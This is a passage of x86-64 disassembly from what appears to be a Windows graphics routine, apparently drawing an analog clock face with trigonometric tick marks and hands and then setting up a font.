  402775:	8d 95 86 00 00 00    	lea    0x86(%rbp),%edx
  40277b:	44 8d 47 4d          	lea    0x4d(%rdi),%r8d
  40277f:	48 89 f1             	mov    %rsi,%rcx
  402782:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  402787:	41 ff d2             	call   *%r10
  40278a:	8b 2d a8 89 00 00    	mov    0x89a8(%rip),%ebp        # 0x40b138
  402790:	8b 3d 9e 89 00 00    	mov    0x899e(%rip),%edi        # 0x40b134
  402796:	45 31 c9             	xor    %r9d,%r9d
  402799:	48 89 f1             	mov    %rsi,%rcx
  40279c:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  4027a3:	00 
  4027a4:	8d 55 57             	lea    0x57(%rbp),%edx
  4027a7:	44 8d 87 97 00 00 00 	lea    0x97(%rdi),%r8d
  4027ae:	41 ff d2             	call   *%r10
  4027b1:	8d 55 4d             	lea    0x4d(%rbp),%edx
  4027b4:	44 8d 87 86 00 00 00 	lea    0x86(%rdi),%r8d
  4027bb:	48 89 f1             	mov    %rsi,%rcx
  4027be:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  4027c3:	41 ff d2             	call   *%r10
  4027c6:	8b 3d 6c 89 00 00    	mov    0x896c(%rip),%edi        # 0x40b138
  4027cc:	8b 2d 62 89 00 00    	mov    0x8962(%rip),%ebp        # 0x40b134
  4027d2:	45 31 c9             	xor    %r9d,%r9d
  4027d5:	48 89 f1             	mov    %rsi,%rcx
  4027d8:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  4027df:	00 
  4027e0:	44 8d 85 ae 00 00 00 	lea    0xae(%rbp),%r8d
  4027e7:	89 fa                	mov    %edi,%edx
  4027e9:	41 ff d2             	call   *%r10
  4027ec:	44 8d 85 9a 00 00 00 	lea    0x9a(%rbp),%r8d
  4027f3:	89 fa                	mov    %edi,%edx
  4027f5:	48 89 f1             	mov    %rsi,%rcx
  4027f8:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  4027fd:	41 ff d2             	call   *%r10
  402800:	8b 2d 32 89 00 00    	mov    0x8932(%rip),%ebp        # 0x40b138
  402806:	8b 3d 28 89 00 00    	mov    0x8928(%rip),%edi        # 0x40b134
  40280c:	45 31 c9             	xor    %r9d,%r9d
  40280f:	48 89 f1             	mov    %rsi,%rcx
  402812:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  402819:	00 
  40281a:	8d 55 a9             	lea    -0x57(%rbp),%edx
  40281d:	44 8d 87 97 00 00 00 	lea    0x97(%rdi),%r8d
  402824:	41 ff d2             	call   *%r10
  402827:	8d 55 b3             	lea    -0x4d(%rbp),%edx
  40282a:	44 8d 87 86 00 00 00 	lea    0x86(%rdi),%r8d
  402831:	48 89 f1             	mov    %rsi,%rcx
  402834:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  402839:	41 ff d2             	call   *%r10
  40283c:	8b 2d f6 88 00 00    	mov    0x88f6(%rip),%ebp        # 0x40b138
  402842:	8b 3d ec 88 00 00    	mov    0x88ec(%rip),%edi        # 0x40b134
  402848:	45 31 c9             	xor    %r9d,%r9d
  40284b:	48 89 f1             	mov    %rsi,%rcx
  40284e:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  402855:	00 
  402856:	8d 95 69 ff ff ff    	lea    -0x97(%rbp),%edx
  40285c:	44 8d 47 57          	lea    0x57(%rdi),%r8d
  402860:	41 ff d2             	call   *%r10
  402863:	8d 95 7a ff ff ff    	lea    -0x86(%rbp),%edx
  402869:	44 8d 47 4d          	lea    0x4d(%rdi),%r8d
  40286d:	48 89 f1             	mov    %rsi,%rcx
  402870:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  402875:	41 ff d2             	call   *%r10
  402878:	8b 2d ba 88 00 00    	mov    0x88ba(%rip),%ebp        # 0x40b138
  40287e:	8b 3d b0 88 00 00    	mov    0x88b0(%rip),%edi        # 0x40b134
  402884:	45 31 c9             	xor    %r9d,%r9d
  402887:	48 89 f1             	mov    %rsi,%rcx
  40288a:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  402891:	00 
  402892:	8d 95 52 ff ff ff    	lea    -0xae(%rbp),%edx
  402898:	41 89 f8             	mov    %edi,%r8d
  40289b:	41 ff d2             	call   *%r10
  40289e:	8d 95 66 ff ff ff    	lea    -0x9a(%rbp),%edx
  4028a4:	41 89 f8             	mov    %edi,%r8d
  4028a7:	48 89 f1             	mov    %rsi,%rcx
  4028aa:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  4028af:	41 ff d2             	call   *%r10
  4028b2:	8b 2d 80 88 00 00    	mov    0x8880(%rip),%ebp        # 0x40b138
  4028b8:	8b 3d 76 88 00 00    	mov    0x8876(%rip),%edi        # 0x40b134
  4028be:	45 31 c9             	xor    %r9d,%r9d
  4028c1:	48 89 f1             	mov    %rsi,%rcx
  4028c4:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  4028cb:	00 
  4028cc:	8d 95 69 ff ff ff    	lea    -0x97(%rbp),%edx
  4028d2:	44 8d 47 a9          	lea    -0x57(%rdi),%r8d
  4028d6:	41 ff d2             	call   *%r10
  4028d9:	8d 95 7a ff ff ff    	lea    -0x86(%rbp),%edx
  4028df:	44 8d 47 b3          	lea    -0x4d(%rdi),%r8d
  4028e3:	48 89 f1             	mov    %rsi,%rcx
  4028e6:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  4028eb:	41 ff d2             	call   *%r10
  4028ee:	8b 2d 44 88 00 00    	mov    0x8844(%rip),%ebp        # 0x40b138
  4028f4:	8b 3d 3a 88 00 00    	mov    0x883a(%rip),%edi        # 0x40b134
  4028fa:	45 31 c9             	xor    %r9d,%r9d
  4028fd:	48 89 f1             	mov    %rsi,%rcx
  402900:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  402907:	00 
  402908:	8d 55 a9             	lea    -0x57(%rbp),%edx
  40290b:	44 8d 87 69 ff ff ff 	lea    -0x97(%rdi),%r8d
  402912:	41 ff d2             	call   *%r10
  402915:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  40291a:	8d 55 b3             	lea    -0x4d(%rbp),%edx
  40291d:	44 8d 87 7a ff ff ff 	lea    -0x86(%rdi),%r8d
  402924:	48 89 f1             	mov    %rsi,%rcx
  402927:	41 ff d2             	call   *%r10
  40292a:	45 31 c0             	xor    %r8d,%r8d
  40292d:	ba 01 00 00 00       	mov    $0x1,%edx
  402932:	31 c9                	xor    %ecx,%ecx
  402934:	ff d3                	call   *%rbx
  402936:	48 89 f1             	mov    %rsi,%rcx
  402939:	48 89 84 24 c8 00 00 	mov    %rax,0xc8(%rsp)
  402940:	00 
  402941:	48 89 c2             	mov    %rax,%rdx
  402944:	4c 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10
  40294b:	00 
  40294c:	31 db                	xor    %ebx,%ebx
  40294e:	41 ff d2             	call   *%r10
  402951:	f2 44 0f 10 1d 1e ac 	movsd  0x15ac1e(%rip),%xmm11        # 0x55d578
  402958:	15 00 
  40295a:	f2 44 0f 10 15 1d ac 	movsd  0x15ac1d(%rip),%xmm10        # 0x55d580
  402961:	15 00 
  402963:	f2 44 0f 10 0d 1c ac 	movsd  0x15ac1c(%rip),%xmm9        # 0x55d588
  40296a:	15 00 
  40296c:	f2 44 0f 10 05 1b ac 	movsd  0x15ac1b(%rip),%xmm8        # 0x55d590
  402973:	15 00 
  402975:	eb 0d                	jmp    0x402984
  402977:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40297e:	00 00 
  402980:	41 83 c6 06          	add    $0x6,%r14d
  402984:	83 c3 01             	add    $0x1,%ebx
  402987:	83 fb 3c             	cmp    $0x3c,%ebx
  40298a:	0f 84 b0 00 00 00    	je     0x402a40
  402990:	89 d8                	mov    %ebx,%eax
  402992:	41 f7 ef             	imul   %r15d
  402995:	89 d8                	mov    %ebx,%eax
  402997:	c1 f8 1f             	sar    $0x1f,%eax
  40299a:	d1 fa                	sar    $1,%edx
  40299c:	29 c2                	sub    %eax,%edx
  40299e:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
  4029a1:	39 c3                	cmp    %eax,%ebx
  4029a3:	74 db                	je     0x402980
  4029a5:	f2 41 0f 2a f6       	cvtsi2sd %r14d,%xmm6
  4029aa:	f2 41 0f 59 f3       	mulsd  %xmm11,%xmm6
  4029af:	f2 41 0f 5e f2       	divsd  %xmm10,%xmm6
  4029b4:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4029b8:	e8 f3 31 00 00       	call   0x405bb0
  4029bd:	66 0f 28 f8          	movapd %xmm0,%xmm7
  4029c1:	8b 3d 6d 87 00 00    	mov    0x876d(%rip),%edi        # 0x40b134
  4029c7:	66 0f 28 c6          	movapd %xmm6,%xmm0
  4029cb:	8b 2d 67 87 00 00    	mov    0x8767(%rip),%ebp        # 0x40b138
  4029d1:	e8 ea 32 00 00       	call   0x405cc0
  4029d6:	66 0f 28 cf          	movapd %xmm7,%xmm1
  4029da:	f2 41 0f 59 f8       	mulsd  %xmm8,%xmm7
  4029df:	41 89 fd             	mov    %edi,%r13d
  4029e2:	41 89 f8             	mov    %edi,%r8d
  4029e5:	4c 8b 94 24 80 00 00 	mov    0x80(%rsp),%r10
  4029ec:	00 
  4029ed:	f2 41 0f 59 c9       	mulsd  %xmm9,%xmm1
  4029f2:	45 31 c9             	xor    %r9d,%r9d
  4029f5:	f2 44 0f 2c e1       	cvttsd2si %xmm1,%r12d
  4029fa:	66 0f 28 c8          	movapd %xmm0,%xmm1
  4029fe:	f2 41 0f 59 c0       	mulsd  %xmm8,%xmm0
  402a03:	f2 41 0f 59 c9       	mulsd  %xmm9,%xmm1
  402a08:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
  402a0c:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
  402a10:	41 01 ec             	add    %ebp,%r12d
  402a13:	41 29 c8             	sub    %ecx,%r8d
  402a16:	48 89 f1             	mov    %rsi,%rcx
  402a19:	41 29 d5             	sub    %edx,%r13d
  402a1c:	f2 0f 2c d7          	cvttsd2si %xmm7,%edx
  402a20:	01 ea                	add    %ebp,%edx
  402a22:	41 ff d2             	call   *%r10
  402a25:	45 89 e8             	mov    %r13d,%r8d
  402a28:	44 89 e2             	mov    %r12d,%edx
  402a2b:	48 89 f1             	mov    %rsi,%rcx
  402a2e:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
  402a33:	41 ff d2             	call   *%r10
  402a36:	e9 45 ff ff ff       	jmp    0x402980
  402a3b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402a40:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
  402a47:	00 
  402a48:	48 89 f1             	mov    %rsi,%rcx
  402a4b:	4c 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10
  402a52:	00 
  402a53:	41 ff d2             	call   *%r10
  402a56:	48 8b 94 24 b8 00 00 	mov    0xb8(%rsp),%rdx
  402a5d:	00 
  402a5e:	4c 8b 94 24 88 00 00 	mov    0x88(%rsp),%r10
  402a65:	00 
  402a66:	48 89 f1             	mov    %rsi,%rcx
  402a69:	41 ff d2             	call   *%r10
  402a6c:	48 8b 1d 61 fa 15 00 	mov    0x15fa61(%rip),%rbx        # 0x5624d4
  402a73:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
  402a7a:	00 
  402a7b:	ff d3                	call   *%rbx
  402a7d:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
  402a84:	00 
  402a85:	ff d3                	call   *%rbx
  402a87:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
  402a8e:	00 
  402a8f:	ff d3                	call   *%rbx
  402a91:	48 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%rcx
  402a98:	00 
  402a99:	ff d3                	call   *%rbx
  402a9b:	48 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%rcx
  402aa2:	00 
  402aa3:	ff d3                	call   *%rbx
  402aa5:	48 8b 8c 24 a8 00 00 	mov    0xa8(%rsp),%rcx
  402aac:	00 
  402aad:	ff d3                	call   *%rbx
  402aaf:	90                   	nop
  402ab0:	0f 28 b4 24 00 01 00 	movaps 0x100(%rsp),%xmm6
  402ab7:	00 
  402ab8:	0f 28 bc 24 10 01 00 	movaps 0x110(%rsp),%xmm7
  402abf:	00 
  402ac0:	44 0f 28 84 24 20 01 	movaps 0x120(%rsp),%xmm8
  402ac7:	00 00 
  402ac9:	44 0f 28 8c 24 30 01 	movaps 0x130(%rsp),%xmm9
  402ad0:	00 00 
  402ad2:	44 0f 28 94 24 40 01 	movaps 0x140(%rsp),%xmm10
  402ad9:	00 00 
  402adb:	44 0f 28 9c 24 50 01 	movaps 0x150(%rsp),%xmm11
  402ae2:	00 00 
  402ae4:	48 81 c4 68 01 00 00 	add    $0x168,%rsp
  402aeb:	5b                   	pop    %rbx
  402aec:	5e                   	pop    %rsi
  402aed:	5f                   	pop    %rdi
  402aee:	5d                   	pop    %rbp
  402aef:	41 5c                	pop    %r12
  402af1:	41 5d                	pop    %r13
  402af3:	41 5e                	pop    %r14
  402af5:	41 5f                	pop    %r15
  402af7:	c3                   	ret
  402af8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402aff:	00 
  402b00:	41 57                	push   %r15
  402b02:	41 56                	push   %r14
  402b04:	41 55                	push   %r13
  402b06:	41 54                	push   %r12
  402b08:	55                   	push   %rbp
  402b09:	57                   	push   %rdi
  402b0a:	56                   	push   %rsi
  402b0b:	53                   	push   %rbx
  402b0c:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
  402b13:	0f 29 74 24 30       	movaps %xmm6,0x30(%rsp)
  402b18:	0f 29 7c 24 40       	movaps %xmm7,0x40(%rsp)
  402b1d:	44 0f 29 44 24 50    	movaps %xmm8,0x50(%rsp)
  402b23:	44 0f 29 4c 24 60    	movaps %xmm9,0x60(%rsp)
  402b29:	44 0f 29 54 24 70    	movaps %xmm10,0x70(%rsp)
  402b2f:	f2 0f 2a 05 e9 d5 15 	cvtsi2sdl 0x15d5e9(%rip),%xmm0        # 0x560120
  402b36:	00 
  402b37:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
  402b3c:	45 31 c0             	xor    %r8d,%r8d
  402b3f:	48 89 cb             	mov    %rcx,%rbx
  402b42:	8b 0d e8 d5 15 00    	mov    0x15d5e8(%rip),%ecx        # 0x560130
  402b48:	f2 44 0f 10 15 47 aa 	movsd  0x15aa47(%rip),%xmm10        # 0x55d598
  402b4f:	15 00 
  402b51:	f2 44 0f 10 05 1e aa 	movsd  0x15aa1e(%rip),%xmm8        # 0x55d578
  402b58:	15 00 
  402b5a:	4c 8b 25 5b f9 15 00 	mov    0x15f95b(%rip),%r12        # 0x5624bc
  402b61:	f2 41 0f 5e c2       	divsd  %xmm10,%xmm0
  402b66:	89 c8                	mov    %ecx,%eax
  402b68:	f7 ea                	imul   %edx
  402b6a:	89 c8                	mov    %ecx,%eax
  402b6c:	c1 f8 1f             	sar    $0x1f,%eax
  402b6f:	d1 fa                	sar    $1,%edx
  402b71:	29 c2                	sub    %eax,%edx
  402b73:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
  402b76:	ba 0a 00 00 00       	mov    $0xa,%edx
  402b7b:	c1 e0 02             	shl    $0x2,%eax
  402b7e:	29 c1                	sub    %eax,%ecx
  402b80:	f2 0f 2a f1          	cvtsi2sd %ecx,%xmm6
  402b84:	31 c9                	xor    %ecx,%ecx
  402b86:	f2 0f 10 3d f2 a9 15 	movsd  0x15a9f2(%rip),%xmm7        # 0x55d580
  402b8d:	00 
  402b8e:	f2 0f 58 f0          	addsd  %xmm0,%xmm6
  402b92:	f2 0f 2a 05 76 d5 15 	cvtsi2sdl 0x15d576(%rip),%xmm0        # 0x560110
  402b99:	00 
  402b9a:	f2 0f 5e 05 fe a9 15 	divsd  0x15a9fe(%rip),%xmm0        # 0x55d5a0
  402ba1:	00 
  402ba2:	f2 0f 58 f0          	addsd  %xmm0,%xmm6
  402ba6:	f2 0f 59 35 fa a9 15 	mulsd  0x15a9fa(%rip),%xmm6        # 0x55d5a8
  402bad:	00 
  402bae:	41 ff d4             	call   *%r12
  402bb1:	48 8b 35 4c f9 15 00 	mov    0x15f94c(%rip),%rsi        # 0x562504
  402bb8:	49 89 c6             	mov    %rax,%r14
  402bbb:	48 89 d9             	mov    %rbx,%rcx
  402bbe:	48 89 c2             	mov    %rax,%rdx
  402bc1:	ff d6                	call   *%rsi
  402bc3:	45 31 c9             	xor    %r9d,%r9d
  402bc6:	48 89 d9             	mov    %rbx,%rcx
  402bc9:	48 8b 2d 24 f9 15 00 	mov    0x15f924(%rip),%rbp        # 0x5624f4
  402bd0:	f2 41 0f 59 f0       	mulsd  %xmm8,%xmm6
  402bd5:	44 8b 05 58 85 00 00 	mov    0x8558(%rip),%r8d        # 0x40b134
  402bdc:	8b 15 56 85 00 00    	mov    0x8556(%rip),%edx        # 0x40b138
  402be2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  402be7:	ff d5                	call   *%rbp
  402be9:	f2 0f 5e f7          	divsd  %xmm7,%xmm6
  402bed:	66 0f 28 c6          	movapd %xmm6,%xmm0
  402bf1:	e8 ca 30 00 00       	call   0x405cc0
  402bf6:	66 44 0f 28 c8       	movapd %xmm0,%xmm9
  402bfb:	66 0f 28 c6          	movapd %xmm6,%xmm0
  402bff:	e8 ac 2f 00 00       	call   0x405bb0
  402c04:	66 41 0f 28 c9       	movapd %xmm9,%xmm1
  402c09:	44 8b 05 24 85 00 00 	mov    0x8524(%rip),%r8d        # 0x40b134
  402c10:	66 0f 28 f0          	movapd %xmm0,%xmm6
  402c14:	48 8b 3d d1 f8 15 00 	mov    0x15f8d1(%rip),%rdi        # 0x5624ec
  402c1b:	f2 0f 10 05 8d a9 15 	movsd  0x15a98d(%rip),%xmm0        # 0x55d5b0
  402c22:	00 
  402c23:	48 89 d9             	mov    %rbx,%rcx
  402c26:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
  402c2a:	f2 0f 59 c6          	mulsd  %xmm6,%xmm0
  402c2e:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
  402c32:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
  402c36:	03 15 fc 84 00 00    	add    0x84fc(%rip),%edx        # 0x40b138
  402c3c:	41 29 c0             	sub    %eax,%r8d
  402c3f:	ff d7                	call   *%rdi
  402c41:	41 b8 c8 c8 c8 00    	mov    $0xc8c8c8,%r8d
  402c47:	31 c9                	xor    %ecx,%ecx
  402c49:	ba 03 00 00 00       	mov    $0x3,%edx
  402c4e:	41 ff d4             	call   *%r12
  402c51:	48 89 d9             	mov    %rbx,%rcx
  402c54:	49 89 c7             	mov    %rax,%r15
  402c57:	48 89 c2             	mov    %rax,%rdx
  402c5a:	ff d6                	call   *%rsi
  402c5c:	f2 0f 10 05 54 a9 15 	movsd  0x15a954(%rip),%xmm0        # 0x55d5b8
  402c63:	00 
  402c64:	44 8b 05 c9 84 00 00 	mov    0x84c9(%rip),%r8d        # 0x40b134
  402c6b:	66 41 0f 28 c9       	movapd %xmm9,%xmm1
  402c70:	45 31 c9             	xor    %r9d,%r9d
  402c73:	48 89 d9             	mov    %rbx,%rcx
  402c76:	f2 0f 59 c8          	mulsd  %xmm0,%xmm1
  402c7a:	f2 0f 59 c6          	mulsd  %xmm6,%xmm0
  402c7e:	f2 0f 2c c1          	cvttsd2si %xmm1,%eax
  402c82:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
  402c86:	03 15 ac 84 00 00    	add    0x84ac(%rip),%edx        # 0x40b138
  402c8c:	41 29 c0             	sub    %eax,%r8d
  402c8f:	ff d5                	call   *%rbp
  402c91:	f2 0f 10 05 27 a9 15 	movsd  0x15a927(%rip),%xmm0        # 0x55d5c0
  402c98:	00 
  402c99:	44 8b 05 94 84 00 00 	mov    0x8494(%rip),%r8d        # 0x40b134
  402ca0:	48 89 d9             	mov    %rbx,%rcx
  402ca3:	f2 44 0f 59 c8       	mulsd  %xmm0,%xmm9
  402ca8:	f2 0f 59 f0          	mulsd  %xmm0,%xmm6
  402cac:	f2 41 0f 2c c1       	cvttsd2si %xmm9,%eax
  402cb1:	f2 0f 2c d6          	cvttsd2si %xmm6,%edx
  402cb5:	03 15 7d 84 00 00    	add    0x847d(%rip),%edx        # 0x40b138
  402cbb:	41 29 c0             	sub    %eax,%r8d
  402cbe:	ff d7                	call   *%rdi
  402cc0:	f2 0f 2a 05 48 d4 15 	cvtsi2sdl 0x15d448(%rip),%xmm0        # 0x560110
  402cc7:	00 
  402cc8:	f2 0f 2a 35 50 d4 15 	cvtsi2sdl 0x15d450(%rip),%xmm6        # 0x560120
  402ccf:	00 
  402cd0:	f2 41 0f 5e c2       	divsd  %xmm10,%xmm0
  402cd5:	45 31 c0             	xor    %r8d,%r8d
  402cd8:	31 c9                	xor    %ecx,%ecx
  402cda:	ba 04 00 00 00       	mov    $0x4,%edx
  402cdf:	f2 0f 58 f0          	addsd  %xmm0,%xmm6
  402ce3:	f2 0f 59 35 dd a8 15 	mulsd  0x15a8dd(%rip),%xmm6        # 0x55d5c8
  402cea:	00 
  402ceb:	41 ff d4             	call   *%r12
  402cee:	48 89 d9             	mov    %rbx,%rcx
  402cf1:	49 89 c5             	mov    %rax,%r13
  402cf4:	48 89 c2             	mov    %rax,%rdx
  402cf7:	ff d6                	call   *%rsi
  402cf9:	45 31 c9             	xor    %r9d,%r9d
  402cfc:	48 89 d9             	mov    %rbx,%rcx
  402cff:	44 8b 05 2e 84 00 00 	mov    0x842e(%rip),%r8d        # 0x40b134
  402d06:	8b 15 2c 84 00 00    	mov    0x842c(%rip),%edx        # 0x40b138
  402d0c:	f2 41 0f 59 f0       	mulsd  %xmm8,%xmm6
  402d11:	ff d5                	call   *%rbp
  402d13:	f2 0f 5e f7          	divsd  %xmm7,%xmm6
  402d17:	66 0f 28 c6          	movapd %xmm6,%xmm0
  402d1b:	e8 a0 2f 00 00       	call   0x405cc0
  402d20:	66 44 0f 28 c8       	movapd %xmm0,%xmm9
  402d25:	66 0f 28 c6          	movapd %xmm6,%xmm0
  402d29:	e8 82 2e 00 00       	call   0x405bb0
  402d2e:	f2 0f 10 15 9a a8 15 	movsd  0x15a89a(%rip),%xmm2        # 0x55d5d0
  402d35:	00 
  402d36:	44 8b 05 f7 83 00 00 	mov    0x83f7(%rip),%r8d        # 0x40b134
  402d3d:	48 89 d9             	mov    %rbx,%rcx
  402d40:	f2 44 0f 59 ca       	mulsd  %xmm2,%xmm9
  402d45:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
  402d49:	f2 41 0f 2c c1       	cvttsd2si %xmm9,%eax
  402d4e:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
  402d52:	03 15 e0 83 00 00    	add    0x83e0(%rip),%edx        # 0x40b138
  402d58:	41 29 c0             	sub    %eax,%r8d
  402d5b:	ff d7                	call   *%rdi
  402d5d:	8b 05 ad d3 15 00    	mov    0x15d3ad(%rip),%eax        # 0x560110
  402d63:	45 31 c0             	xor    %r8d,%r8d
  402d66:	31 c9                	xor    %ecx,%ecx
  402d68:	ba 01 00 00 00       	mov    $0x1,%edx
  402d6d:	8d 04 40             	lea    (%rax,%rax,2),%eax
  402d70:	01 c0                	add    %eax,%eax
  402d72:	f2 0f 2a f0          	cvtsi2sd %eax,%xmm6
  402d76:	41 ff d4             	call   *%r12
  402d79:	48 89 d9             	mov    %rbx,%rcx
  402d7c:	49 89 c4             	mov    %rax,%r12
  402d7f:	48 89 c2             	mov    %rax,%rdx
  402d82:	ff d6                	call   *%rsi
  402d84:	45 31 c9             	xor    %r9d,%r9d
  402d87:	48 89 d9             	mov    %rbx,%rcx
  402d8a:	44 8b 05 a3 83 00 00 	mov    0x83a3(%rip),%r8d        # 0x40b134
  402d91:	8b 15 a1 83 00 00    	mov    0x83a1(%rip),%edx        # 0x40b138
  402d97:	ff d5                	call   *%rbp
  402d99:	f2 41 0f 59 f0       	mulsd  %xmm8,%xmm6
  402d9e:	f2 0f 5e f7          	divsd  %xmm7,%xmm6
  402da2:	66 0f 28 c6          	movapd %xmm6,%xmm0
  402da6:	e8 15 2f 00 00       	call   0x405cc0
  402dab:	66 0f 28 f8          	movapd %xmm0,%xmm7
  402daf:	66 0f 28 c6          	movapd %xmm6,%xmm0
  402db3:	e8 f8 2d 00 00       	call   0x405bb0
  402db8:	f2 0f 10 15 18 a8 15 	movsd  0x15a818(%rip),%xmm2        # 0x55d5d8
  402dbf:	00 
  402dc0:	44 8b 05 6d 83 00 00 	mov    0x836d(%rip),%r8d        # 0x40b134
  402dc7:	48 89 d9             	mov    %rbx,%rcx
  402dca:	f2 0f 59 fa          	mulsd  %xmm2,%xmm7
  402dce:	f2 0f 59 c2          	mulsd  %xmm2,%xmm0
  402dd2:	f2 0f 2c c7          	cvttsd2si %xmm7,%eax
  402dd6:	f2 0f 2c d0          	cvttsd2si %xmm0,%edx
  402dda:	03 15 58 83 00 00    	add    0x8358(%rip),%edx        # 0x40b138
  402de0:	41 29 c0             	sub    %eax,%r8d
  402de3:	ff d7                	call   *%rdi
  402de5:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  402dea:	48 89 d9             	mov    %rbx,%rcx
  402ded:	ff d6                	call   *%rsi
  402def:	48 8b 1d de f6 15 00 	mov    0x15f6de(%rip),%rbx        # 0x5624d4
  402df6:	4c 89 f1             	mov    %r14,%rcx
  402df9:	ff d3                	call   *%rbx
  402dfb:	4c 89 f9             	mov    %r15,%rcx
  402dfe:	ff d3                	call   *%rbx
  402e00:	4c 89 e9             	mov    %r13,%rcx
  402e03:	ff d3                	call   *%rbx
  402e05:	90                   	nop
  402e06:	0f 28 74 24 30       	movaps 0x30(%rsp),%xmm6
  402e0b:	4c 89 e1             	mov    %r12,%rcx
  402e0e:	48 89 da             	mov    %rbx,%rdx
  402e11:	0f 28 7c 24 40       	movaps 0x40(%rsp),%xmm7
  402e16:	44 0f 28 44 24 50    	movaps 0x50(%rsp),%xmm8
  402e1c:	44 0f 28 4c 24 60    	movaps 0x60(%rsp),%xmm9
  402e22:	44 0f 28 54 24 70    	movaps 0x70(%rsp),%xmm10
  402e28:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
  402e2f:	5b                   	pop    %rbx
  402e30:	5e                   	pop    %rsi
  402e31:	5f                   	pop    %rdi
  402e32:	5d                   	pop    %rbp
  402e33:	41 5c                	pop    %r12
  402e35:	41 5d                	pop    %r13
  402e37:	41 5e                	pop    %r14
  402e39:	41 5f                	pop    %r15
  402e3b:	48 ff e2             	rex.W jmp *%rdx
  402e3e:	66 90                	xchg   %ax,%ax
  402e40:	41 57                	push   %r15
  402e42:	41 56                	push   %r14
  402e44:	41 55                	push   %r13
  402e46:	41 54                	push   %r12
  402e48:	55                   	push   %rbp
  402e49:	57                   	push   %rdi
  402e4a:	56                   	push   %rsi
  402e4b:	53                   	push   %rbx
  402e4c:	48 81 ec b8 00 00 00 	sub    $0xb8,%rsp
  402e53:	41 b8 c8 c8 c8 00    	mov    $0xc8c8c8,%r8d
  402e59:	ba 03 00 00 00       	mov    $0x3,%edx
  402e5e:	48 89 cb             	mov    %rcx,%rbx
  402e61:	31 c9                	xor    %ecx,%ecx
  402e63:	4c 8d 7c 24 70       	lea    0x70(%rsp),%r15
  402e68:	ff 15 4e f6 15 00    	call   *0x15f64e(%rip)        # 0x5624bc
  402e6e:	48 89 d9             	mov    %rbx,%rcx
  402e71:	48 89 c2             	mov    %rax,%rdx
  402e74:	48 8b 35 89 f6 15 00 	mov    0x15f689(%rip),%rsi        # 0x562504
  402e7b:	49 89 c4             	mov    %rax,%r12
  402e7e:	ff d6                	call   *%rsi
  402e80:	41 b9 7a 03 00 00    	mov    $0x37a,%r9d
  402e86:	41 b8 78 00 00 00    	mov    $0x78,%r8d
  402e8c:	ba 6c 02 00 00       	mov    $0x26c,%edx
  402e91:	48 89 d9             	mov    %rbx,%rcx
  402e94:	49 89 c6             	mov    %rax,%r14
  402e97:	c7 44 24 20 22 01 00 	movl   $0x122,0x20(%rsp)
  402e9e:	00 
  402e9f:	ff 15 57 f6 15 00    	call   *0x15f657(%rip)        # 0x5624fc
  402ea5:	48 8d 05 ee a3 15 00 	lea    0x15a3ee(%rip),%rax        # 0x55d29a
  402eac:	45 31 c9             	xor    %r9d,%r9d
  402eaf:	45 31 c0             	xor    %r8d,%r8d
  402eb2:	31 d2                	xor    %edx,%edx
  402eb4:	b9 14 00 00 00       	mov    $0x14,%ecx
  402eb9:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
  402ec0:	00 
  402ec1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
  402ec6:	c7 44 24 58 00 00 00 	movl   $0x0,0x58(%rsp)
  402ecd:	00 
  402ece:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
  402ed5:	00 
  402ed6:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
  402edd:	00 
  402ede:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
  402ee5:	00 
  402ee6:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
  402eed:	00 
  402eee:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  402ef5:	00 
  402ef6:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  402efd:	00 
  402efe:	c7 44 24 20 90 01 00 	movl   $0x190,0x20(%rsp)
  402f05:	00 
